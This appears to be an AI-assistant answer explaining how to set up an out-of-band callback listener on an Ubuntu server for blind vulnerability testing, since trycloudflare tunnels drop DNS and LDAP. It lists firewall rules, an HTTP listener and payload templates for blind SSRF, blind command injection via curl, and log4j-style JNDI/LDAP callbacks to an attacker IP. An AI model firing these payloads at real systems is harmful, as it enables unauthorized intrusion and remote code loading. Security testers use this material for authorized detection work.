No, you cannot get a "perfect" multi-protocol OOB setup this way.
Even if you run cloudflared in Termux to generate a live .trycloudflare.com domain and try to route it to your Ubuntu server, it cannot handle a complete OOB test suite. [1, 2] 
## The Problem
cloudflared trycloudflare tunnels strictly proxy Layer 7 HTTP/HTTPS web traffic. They completely drop raw DNS queries (UDP 53) and alternative protocols like LDAP or SMTP. Because a "perfect" OOB pipeline depends heavily on catching raw DNS interactions (like triggering ${jndi:dns://...} to catch blind log4j injections), Cloudflare will blind your setup to those requests. [2, 3] 
## How to use your Ubuntu server for a Perfect OOB Setup (No Domain Needed)
Instead of fighting Cloudflare's HTTP restrictions, you can use your Ubuntu server as a direct, unconstrained listener. Because your Ubuntu machine has a public IP address, it can listen to any protocol.
Instead of a domain, your Ubuntu Public IP address can act as your OOB identifier:
## 1. Prepare your Ubuntu Server
Open the raw firewalls on your Ubuntu machine to accept HTTP, DNS, and LDAP interactions:

sudo ufw allow 53/udp
sudo ufw allow 80/tcp
sudo ufw allow 389/tcp

## 2. Start a Multi-Protocol Listener on Ubuntu
You can use a tool like netcat, or write a quick Python script to log any incoming ping to your Ubuntu IP. To listen for direct HTTP interactions, simply run:

sudo python3 -m http.server 80

## 3. Fire the Payloads using your Ubuntu IP
Instead of using a domain name, insert your Ubuntu server's public IP address directly into your out-of-band payloads:

* 
* Blind SSRF: http://YOUR_UBUNTU_IP/capture
* Blind Command Injection: curl http://YOUR_UBUNTU_IP/
* Blind LDAP/RMI: ldap://YOUR_UBUNTU_IP:389/a
